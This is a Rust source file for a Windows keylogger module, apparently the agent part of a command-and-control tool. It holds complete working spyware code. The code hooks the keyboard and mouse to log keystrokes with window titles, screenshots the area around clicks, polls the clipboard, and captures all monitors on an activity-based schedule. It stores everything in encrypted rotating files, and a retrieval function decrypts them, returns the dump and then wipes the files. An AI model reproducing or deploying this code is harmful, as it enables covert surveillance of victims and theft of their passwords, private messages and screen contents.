// ./src/agent/keylogger.rs
#![allow(static_mut_refs)]

use std::sync::{Arc, Mutex};
use std::io::{Read, Write};
use std::fs::{self, OpenOptions};
use std::path::Path; // PathBuf warning fixed by removal or just keeping Path
use std::thread;
use std::time::Duration; // Kept for thread::sleep

// [FIX] Guard these imports so they don't warn on Linux
#[cfg(target_os = "windows")]
use std::sync::atomic::{AtomicU64, Ordering};
#[cfg(target_os = "windows")]
use std::time::{SystemTime, UNIX_EPOCH};

// Crypto & Utils
use aes_gcm::aead::{Aead, KeyInit};
use aes_gcm::{Aes256Gcm, Nonce};
use rand::{rngs::OsRng, RngCore};
use sha2::{Sha256, Digest};
use chrono::Utc;      
use crate::utils; 

// [FIX] Only import the json macro if on Windows
#[cfg(target_os = "windows")]
use serde_json::json; 

// --- CONFIGURATION ---
const STORAGE_DIR: &str = "./data";
const CURRENT_LOG_FILE: &str = "current.bin";
const MAX_FILE_SIZE: u64 = 10 * 1024 * 1024; // 10 MB
const MAX_FILE_AGE_SECS: u64 = 30 * 60;      // 30 Minutes

// --- GLOBAL BUFFER ---
static mut KEYLOG_BUFFER: Option<Arc<Mutex<String>>> = None;

// [FIX] Guard this static so it doesn't warn on Linux
#[cfg(target_os = "windows")]
static LAST_ACTIVITY_SECS: AtomicU64 = AtomicU64::new(0);

// Dynamic Key Generation
fn get_local_storage_key() -> [u8; 32] {
    let machine_id = utils::get_persistent_id();
    let mut hasher = Sha256::new();
    hasher.update(machine_id.as_bytes());
    hasher.update(b"secure_c2_local_storage_salt_v1"); 
    let result = hasher.finalize();
    
    let mut key = [0u8; 32];
    key.copy_from_slice(&result);
    key
}

// [FIX] Guard this function so it doesn't warn on Linux
#[cfg(target_os = "windows")]
fn update_activity() {
    if let Ok(n) = SystemTime::now().duration_since(UNIX_EPOCH) {
        LAST_ACTIVITY_SECS.store(n.as_secs(), Ordering::Relaxed);
    }
}

// 1. Initialize Buffer & Background Flush Thread
pub fn init_buffer() -> Arc<Mutex<String>> {
    let buffer = Arc::new(Mutex::new(String::new()));
    
    unsafe {
        KEYLOG_BUFFER = Some(buffer.clone());
    }

    let buf_clone = buffer.clone();
    thread::spawn(move || {
        // Ensure storage directory exists
        let _ = fs::create_dir_all(STORAGE_DIR);

        loop {
            thread::sleep(Duration::from_secs(5));
            
            // 1. Check Rotation Policy (Size or Time)
            if let Err(e) = check_and_rotate_log() {
                eprintln!("[-] Rotation Error: {}", e);
            }

            // 2. Flush RAM to Disk
            let mut data_chunk = String::new();
            {
                if let Ok(mut guard) = buf_clone.lock() {
                    if !guard.is_empty() {
                        data_chunk = guard.clone();
                        guard.clear();
                    }
                }
            }

            if !data_chunk.is_empty() {
                if let Err(e) = secure_append(&data_chunk) {
                    eprintln!("[-] Log Flush Error: {}", e);
                }
            }
        }
    });

    buffer
}

// Rotates current.bin -> archive_<ts>.bin if limits exceeded
fn check_and_rotate_log() -> std::io::Result<()> {
    let current_path = Path::new(STORAGE_DIR).join(CURRENT_LOG_FILE);
    if !current_path.exists() { return Ok(()); }

    let metadata = fs::metadata(&current_path)?;
    
    // Check Size
    let size_exceeded = metadata.len() >= MAX_FILE_SIZE;

    // Check Age
    let age_exceeded = if let Ok(created) = metadata.created() {
        if let Ok(elapsed) = created.elapsed() {
            elapsed.as_secs() >= MAX_FILE_AGE_SECS
        } else { false }
    } else { false }; 

    if size_exceeded || age_exceeded {
        let timestamp = Utc::now().format("%Y%m%d_%H%M%S").to_string();
        let archive_name = format!("archive_{}.bin", timestamp);
        let archive_path = Path::new(STORAGE_DIR).join(archive_name);
        
        fs::rename(current_path, archive_path)?;
    }

    Ok(())
}

fn secure_append(text: &str) -> Result<(), Box<dyn std::error::Error>> {
    let path = Path::new(STORAGE_DIR).join(CURRENT_LOG_FILE);

    let key = get_local_storage_key();
    let cipher = Aes256Gcm::new(&key.into());
    
    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = Nonce::from_slice(&nonce_bytes);

    let ciphertext = cipher.encrypt(nonce, text.as_bytes())
        .map_err(|e| format!("Encrypt failed: {}", e))?;

    let mut file = OpenOptions::new().create(true).append(true).open(path)?;
    
    // Header: [Length u32 LE][Nonce 12][Ciphertext]
    let len = (ciphertext.len() as u32).to_le_bytes();
    file.write_all(&len)?;
    file.write_all(&nonce_bytes)?;
    file.write_all(&ciphertext)?;

    Ok(())
}

// 3. Retrieve All Logs (Iterate Archives + Current, Decrypt, Combine, Delete)
pub fn get_logs() -> String {
    let dir = Path::new(STORAGE_DIR);
    if !dir.exists() { return String::new(); }

    let mut files_to_process = Vec::new();

    // 1. Identify all bin files
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            if let Some(ext) = path.extension() {
                if ext == "bin" {
                    files_to_process.push(path);
                }
            }
        }
    }

    if files_to_process.is_empty() { return String::new(); }

    // 2. Sort by name (archive_ comes before current)
    files_to_process.sort(); 

    let key = get_local_storage_key();
    let cipher = Aes256Gcm::new(&key.into());
    let mut combined_data = String::from("KEYLOG_DUMP:\n"); 

    for path in &files_to_process {
        if let Ok(mut file) = fs::File::open(path) {
            let mut buffer = Vec::new();
            if file.read_to_end(&mut buffer).is_ok() {
                // Decrypt Loop for this file
                let mut cursor = 0;
                while cursor < buffer.len() {
                    if cursor + 4 > buffer.len() { break; }
                    let len_bytes: [u8; 4] = buffer[cursor..cursor+4].try_into().unwrap();
                    let len = u32::from_le_bytes(len_bytes) as usize;
                    cursor += 4;

                    if cursor + 12 > buffer.len() { break; }
                    let nonce_bytes = &buffer[cursor..cursor+12];
                    let nonce = Nonce::from_slice(nonce_bytes);
                    cursor += 12;

                    if cursor + len > buffer.len() { break; }
                    let ciphertext = &buffer[cursor..cursor+len];
                    cursor += len;

                    if let Ok(pt) = cipher.decrypt(nonce, ciphertext) {
                        if let Ok(s) = String::from_utf8(pt) {
                            combined_data.push_str(&s);
                        }
                    }
                }
            }
        }
    }

    // 3. Wipe files after successful read
    for path in files_to_process {
        let _ = fs::remove_file(path);
    }

    combined_data
}

// --- WINDOWS IMPLEMENTATION ---

#[cfg(target_os = "windows")]
mod windows {
    use std::ptr;
    use std::thread;
    // [FIX] Added SystemTime and UNIX_EPOCH here to fix compilation error
    use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH}; 
    use std::sync::atomic::Ordering;
    use std::ffi::c_void;
    use std::mem;
    use std::io::Cursor;
    
    use image::{RgbaImage, ImageOutputFormat}; 
    use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
    use screenshots::Screen; 
    use serde_json::json;
    use chrono::Utc;

    // Use the gated static from parent
    use super::{update_activity, LAST_ACTIVITY_SECS};

    // State Tracking
    static mut LAST_WINDOW: Option<String> = None;
    static mut LAST_CLIPBOARD: Option<String> = None;

    // FFI Types
    type HHOOK = *mut c_void;
    type HINSTANCE = *mut c_void;
    type LRESULT = isize;
    type WPARAM = usize;
    type LPARAM = isize;
    type HANDLE = *mut c_void;
    
    const WH_KEYBOARD_LL: i32 = 13;
    const WH_MOUSE_LL: i32 = 14;
    const PM_REMOVE: u32 = 0x0001;
    const WM_KEYDOWN: usize = 0x0100;
    const WM_SYSKEYDOWN: usize = 0x0104;
    const WM_MOUSEMOVE: usize = 0x0200;
    const WM_LBUTTONDOWN: usize = 0x0201;
    const WM_RBUTTONDOWN: usize = 0x0204;
    const WM_MOUSEWHEEL: usize = 0x020A;
    const SRCCOPY: u32 = 0x00CC0020;
    const DIB_RGB_COLORS: u32 = 0;
    const BI_RGB: u32 = 0;
    const CF_UNICODETEXT: u32 = 13;

    #[repr(C)]
    #[derive(Copy, Clone)] 
    struct KBDLLHOOKSTRUCT {
        vk_code: u32, scan_code: u32, flags: u32, time: u32, dw_extra_info: usize,
    }

    #[repr(C)]
    #[derive(Copy, Clone)]
    struct MSLLHOOKSTRUCT {
        pt_x: i32, pt_y: i32, mouse_data: u32, flags: u32, time: u32, dw_extra_info: usize,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct BITMAPINFOHEADER {
        biSize: u32, biWidth: i32, biHeight: i32, biPlanes: u16, biBitCount: u16,
        biCompression: u32, biSizeImage: u32, biXPelsPerMeter: i32, biYPelsPerMeter: i32,
        biClrUsed: u32, biClrImportant: u32,
    }

    #[repr(C)]
    #[allow(non_snake_case)]
    struct BITMAPINFO {
        bmiHeader: BITMAPINFOHEADER,
        bmiColors: [u32; 1],
    }

    #[link(name = "user32")]
    extern "system" {
        fn SetWindowsHookExA(id: i32, lpfn: unsafe extern "system" fn(i32, WPARAM, LPARAM) -> LRESULT, hmod: HINSTANCE, dwThreadId: u32) -> HHOOK;
        fn UnhookWindowsHookEx(hhk: HHOOK) -> i32;
        fn CallNextHookEx(hhk: HHOOK, nCode: i32, wParam: WPARAM, lParam: LPARAM) -> LRESULT;
        fn PeekMessageA(lpMsg: *mut c_void, hWnd: *mut c_void, min: u32, max: u32, rem: u32) -> i32;
        fn TranslateMessage(lpMsg: *const c_void) -> i32;
        fn DispatchMessageA(lpMsg: *const c_void) -> isize;
        fn GetForegroundWindow() -> *mut c_void;
        fn GetWindowTextA(hWnd: *mut c_void, lpString: *mut u8, nMaxCount: i32) -> i32;
        fn MapVirtualKeyA(uCode: u32, uMapType: u32) -> u32;
        fn GetKeyState(nVirtKey: i32) -> i16;
        fn GetDC(hWnd: *mut c_void) -> *mut c_void;
        fn ReleaseDC(hWnd: *mut c_void, hDC: *mut c_void) -> i32;
        fn OpenClipboard(hWndNewOwner: *mut c_void) -> i32;
        fn CloseClipboard() -> i32;
        fn GetClipboardData(uFormat: u32) -> HANDLE;
    }

    #[link(name = "gdi32")]
    extern "system" {
        fn CreateCompatibleDC(hdc: *mut c_void) -> *mut c_void;
        fn CreateCompatibleBitmap(hdc: *mut c_void, nWidth: i32, nHeight: i32) -> *mut c_void;
        fn SelectObject(hdc: *mut c_void, hgdiobj: *mut c_void) -> *mut c_void;
        fn BitBlt(hdcDest: *mut c_void, nXDest: i32, nYDest: i32, nWidth: i32, nHeight: i32, hdcSrc: *mut c_void, nXSrc: i32, nYSrc: i32, dwRop: u32) -> i32;
        fn DeleteObject(ho: *mut c_void) -> i32;
        fn DeleteDC(hdc: *mut c_void) -> i32;
        fn GetDIBits(hdc: *mut c_void, hbmp: *mut c_void, uStartScan: u32, cScanLines: u32, lpvBits: *mut c_void, lpbi: *mut BITMAPINFO, uUsage: u32) -> i32;
    }

    #[link(name = "kernel32")]
    extern "system" {
        fn GlobalLock(hMem: HANDLE) -> *mut c_void;
        fn GlobalUnlock(hMem: HANDLE) -> i32;
    }

    static mut KB_HOOK: HHOOK = ptr::null_mut();
    static mut MS_HOOK: HHOOK = ptr::null_mut();
    static mut RUNNING: bool = false;

    unsafe extern "system" fn kb_hook_callback(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
        if n_code >= 0 && (w_param == WM_KEYDOWN || w_param == WM_SYSKEYDOWN) {
            update_activity(); 
            let kbd = *(l_param as *const KBDLLHOOKSTRUCT);
            process_key(kbd.vk_code);
        }
        CallNextHookEx(KB_HOOK, n_code, w_param, l_param)
    }

    unsafe extern "system" fn ms_hook_callback(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
        if n_code >= 0 {
            update_activity(); // Update timestamp on ANY mouse event
            let ms = *(l_param as *const MSLLHOOKSTRUCT);
            let x = ms.pt_x;
            let y = ms.pt_y;

            match w_param {
                WM_LBUTTONDOWN => {
                    log_json("mouse", json!({ "action": "click_left", "x": x, "y": y }));
                    capture_context(x, y);
                },
                WM_RBUTTONDOWN => {
                    log_json("mouse", json!({ "action": "click_right", "x": x, "y": y }));
                },
                WM_MOUSEWHEEL => {
                    let delta = (ms.mouse_data >> 16) as i16;
                    let dir = if delta > 0 { "up" } else { "down" };
                    log_json("mouse", json!({ "action": "scroll", "dir": dir, "x": x, "y": y }));
                },
                _ => {}
            }
        }
        CallNextHookEx(MS_HOOK, n_code, w_param, l_param)
    }

    unsafe fn log_json(event_type: &str, data: serde_json::Value) {
        if let Some(arc) = &super::KEYLOG_BUFFER {
            if let Ok(mut guard) = arc.lock() {
                let entry = json!({
                    "timestamp": Utc::now().to_rfc3339(),
                    "type": event_type,
                    "data": data
                });
                guard.push_str(&entry.to_string());
                guard.push_str("\n");
            }
        }
    }

    unsafe fn process_key(vk_code: u32) {
        let hwnd = GetForegroundWindow();
        let mut title_buf = [0u8; 256];
        let len = GetWindowTextA(hwnd, title_buf.as_mut_ptr(), 256);
        let title = if len > 0 { String::from_utf8_lossy(&title_buf[..len as usize]).to_string() } else { "Unknown".to_string() };

        let key_char = match vk_code {
            0x08 => "[BS]".to_string(), 0x09 => "[TAB]".to_string(), 0x0D => "\n".to_string(), 0x1B => "[ESC]".to_string(),
            0x20 => " ".to_string(), 0x2E => "[DEL]".to_string(), 0x25 => "[LEFT]".to_string(), 0x26 => "[UP]".to_string(),
            0x27 => "[RIGHT]".to_string(), 0x28 => "[DOWN]".to_string(), 0x10 | 0xA0 | 0xA1 => "[SHIFT]".to_string(),
            0x11 | 0xA2 | 0xA3 => "[CTRL]".to_string(), 0x12 | 0xA4 | 0xA5 => "[ALT]".to_string(),
            0x14 => "[CAPS]".to_string(), 0x5B | 0x5C => "[WIN]".to_string(), 0x2C => "[PRINTSCR]".to_string(),
            _ => {
                let scan = MapVirtualKeyA(vk_code, 2);
                if scan > 0 {
                    let shift = GetKeyState(0x10) < 0;
                    let caps = (GetKeyState(0x14) & 1) != 0;
                    let mut c = (scan as u8) as char;
                    if !shift && !caps { c = c.to_ascii_lowercase(); }
                    else if shift && !caps { c = c.to_ascii_uppercase(); }
                    else if !shift && caps { c = c.to_ascii_uppercase(); }
                    else { c = c.to_ascii_lowercase(); }
                    c.to_string()
                } else { String::new() }
            }
        };

        if key_char.is_empty() { return; }

        if let Some(arc) = &super::KEYLOG_BUFFER {
            if let Ok(mut guard) = arc.lock() {
                if let Some(last) = &LAST_WINDOW { 
                    if last != &title { 
                        let entry = json!({
                            "timestamp": Utc::now().to_rfc3339(),
                            "type": "window_change",
                            "data": { "title": title }
                        });
                        guard.push_str(&entry.to_string());
                        guard.push_str("\n");
                        LAST_WINDOW = Some(title.clone()); 
                    } 
                } else { 
                    LAST_WINDOW = Some(title.clone()); 
                }
                
                let entry = json!({
                    "timestamp": Utc::now().to_rfc3339(),
                    "type": "keystroke",
                    "data": { "key": key_char }
                });
                guard.push_str(&entry.to_string());
                guard.push_str("\n");
            }
        }
    }

    unsafe fn capture_context(cx: i32, cy: i32) {
        let width = 100; let height = 100;
        let left = cx - (width / 2); let top = cy - (height / 2);
        let h_screen_dc = GetDC(ptr::null_mut());
        let h_mem_dc = CreateCompatibleDC(h_screen_dc);
        let h_bitmap = CreateCompatibleBitmap(h_screen_dc, width, height);
        let h_old_bmp = SelectObject(h_mem_dc, h_bitmap);

        if BitBlt(h_mem_dc, 0, 0, width, height, h_screen_dc, left, top, SRCCOPY) != 0 {
            let mut bmi: BITMAPINFO = mem::zeroed();
            bmi.bmiHeader.biSize = mem::size_of::<BITMAPINFOHEADER>() as u32;
            bmi.bmiHeader.biWidth = width;
            bmi.bmiHeader.biHeight = -height;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 32;
            bmi.bmiHeader.biCompression = BI_RGB;

            let mut pixels: Vec<u8> = vec![0; (width * height * 4) as usize];
            if GetDIBits(h_mem_dc, h_bitmap, 0, height as u32, pixels.as_mut_ptr() as *mut c_void, &mut bmi, DIB_RGB_COLORS) != 0 {
                for chunk in pixels.chunks_exact_mut(4) {
                    let b = chunk[0]; chunk[0] = chunk[2]; chunk[2] = b; chunk[3] = 255;
                }
                if let Some(img) = RgbaImage::from_raw(width as u32, height as u32, pixels) {
                    let mut cursor = Cursor::new(Vec::new());
                    if img.write_to(&mut cursor, ImageOutputFormat::Png).is_ok() {
                        let b64 = BASE64.encode(cursor.get_ref());
                        log_json("screenshot", json!({
                            "kind": "context_click",
                            "x": cx, "y": cy,
                            "width": width, "height": height,
                            "image_b64": b64
                        }));
                    }
                }
            }
        }
        SelectObject(h_mem_dc, h_old_bmp); DeleteObject(h_bitmap); DeleteDC(h_mem_dc); ReleaseDC(ptr::null_mut(), h_screen_dc);
    }

    // Clipboard Thread
    pub fn start_clipboard_thread() {
        thread::spawn(|| {
            unsafe {
                while RUNNING {
                    let mut is_open = false;
                    for _ in 0..5 {
                        if OpenClipboard(ptr::null_mut()) != 0 {
                            is_open = true;
                            break;
                        }
                        thread::sleep(Duration::from_millis(100));
                    }

                    if is_open {
                        let h_data = GetClipboardData(CF_UNICODETEXT);
                        if !h_data.is_null() {
                            let p_text = GlobalLock(h_data);
                            if !p_text.is_null() {
                                let len = (0..).take_while(|&i| *p_text.cast::<u16>().add(i) != 0).count();
                                let slice = std::slice::from_raw_parts(p_text.cast::<u16>(), len);
                                if let Ok(text) = String::from_utf16(slice) {
                                    let mut changed = false;
                                    if let Some(last) = &LAST_CLIPBOARD {
                                        if last != &text { changed = true; }
                                    } else { changed = true; }

                                    if changed {
                                        log_json("clipboard", json!({ "content": text }));
                                        LAST_CLIPBOARD = Some(text);
                                    }
                                }
                                GlobalUnlock(h_data);
                            }
                        }
                        CloseClipboard();
                    }
                    thread::sleep(Duration::from_secs(1));
                }
            }
        });
    }

    // Adaptive Monitor Capture
    pub fn start_monitor_capture_thread() {
        thread::spawn(|| {
            unsafe {
                // Initialize to past timestamp to trigger immediate capture
                let mut last_capture = Instant::now() - Duration::from_secs(1000); 
                
                while RUNNING {
                    thread::sleep(Duration::from_secs(1));
                    
                    let last_act_secs = LAST_ACTIVITY_SECS.load(Ordering::Relaxed);
                    let now_secs = SystemTime::now().duration_since(UNIX_EPOCH).unwrap_or(Duration::ZERO).as_secs();
                    let seconds_idle = now_secs.saturating_sub(last_act_secs);

                    let interval = if seconds_idle <= 61 { 60 } else { 900 };

                    if last_capture.elapsed().as_secs() >= interval {
                        let screens = Screen::all().unwrap_or_default();
                        for (i, screen) in screens.iter().enumerate() {
                            if let Ok(image) = screen.capture() {
                                let mut cursor = Cursor::new(Vec::new());
                                // Write ImageBuffer to PNG
                                if image.write_to(&mut cursor, ImageOutputFormat::Png).is_ok() {
                                    let b64 = BASE64.encode(cursor.get_ref());
                                    log_json("screenshot", json!({
                                        "kind": "full_monitor",
                                        "monitor_index": i,
                                        "image_b64": b64
                                    }));
                                }
                            }
                        }
                        last_capture = Instant::now();
                    }
                }
            }
        });
    }

    pub fn start_hook_thread() {
        unsafe { if RUNNING { return; } RUNNING = true; }
        
        thread::spawn(|| unsafe {
            KB_HOOK = SetWindowsHookExA(WH_KEYBOARD_LL, kb_hook_callback, ptr::null_mut(), 0);
            MS_HOOK = SetWindowsHookExA(WH_MOUSE_LL, ms_hook_callback, ptr::null_mut(), 0);
            if KB_HOOK.is_null() || MS_HOOK.is_null() { RUNNING = false; return; }
            let mut msg: [u8; 48] = [0; 48];
            while RUNNING {
                if PeekMessageA(msg.as_mut_ptr() as *mut _, ptr::null_mut(), 0, 0, PM_REMOVE) > 0 {
                    TranslateMessage(msg.as_ptr() as *const _); DispatchMessageA(msg.as_ptr() as *const _);
                }
                thread::sleep(Duration::from_millis(5));
            }
            UnhookWindowsHookEx(KB_HOOK); UnhookWindowsHookEx(MS_HOOK);
            KB_HOOK = ptr::null_mut(); MS_HOOK = ptr::null_mut();
        });

        start_monitor_capture_thread();
        start_clipboard_thread();
    }

    pub fn stop_hook() { unsafe { RUNNING = false; } }
}

pub fn start() -> String {
    #[cfg(target_os = "windows")] { windows::start_hook_thread(); "Tracking Started (Key/Mouse/Screens/Clip/Adaptive)".to_string() }
    #[cfg(not(target_os = "windows"))] "Not supported on Linux/Mac".to_string()
}

pub fn stop() -> String {
    #[cfg(target_os = "windows")] { windows::stop_hook(); "Tracking Stopped".to_string() }
    #[cfg(not(target_os = "windows"))] "Not supported".to_string()
}
